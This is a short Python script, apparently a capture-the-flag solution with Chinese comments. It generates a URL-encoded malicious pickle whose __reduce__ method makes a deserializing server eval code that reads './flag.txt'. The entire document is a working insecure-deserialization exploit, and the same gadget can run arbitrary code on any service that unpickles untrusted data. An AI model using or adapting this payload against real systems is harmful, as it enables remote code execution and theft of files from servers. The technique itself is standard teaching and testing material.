import pickle
import builtins
import urllib.parse


class EvilPickle:
    def __reduce__(self):
        # 当反序列化时，这个函数会被调用
        # 它返回一个元组，其中包含一个可调用的对象和一个参数列表
        # 在这个例子中，我们返回eval函数和它应该执行的字符串
        return (builtins.eval, ("open('./flag.txt', 'r').read()",))


# 序列化EvilPickle实例
pickle_string = pickle.dumps(EvilPickle())
# print(pickle_string)
p = urllib.parse.quote(pickle_string)
print(p)
